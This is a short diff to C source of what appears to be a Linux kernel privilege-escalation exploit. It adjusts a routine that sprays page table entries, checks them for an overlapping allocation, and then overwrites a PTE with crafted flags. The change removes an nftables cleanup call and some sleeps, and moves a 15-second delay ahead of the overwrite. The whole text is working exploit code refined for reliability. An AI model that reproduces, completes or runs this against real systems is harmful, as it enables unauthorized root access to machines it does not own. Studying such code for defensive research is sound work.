@@ -354,9 +354,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
-	//remove created rule just in case
-	unconfigure_nftables();
-	sleep(15);
 	// find overlapped PTE area
 	pte_area = NULL;
 	//printf("[*] SLEEP 1s before search...\n");
@@ -364,9 +361,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
-		if (i % 1000 == 0){
-			sleep(1);
-			}
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
@@ -384,7 +378,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-	
+	sleep(15);
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
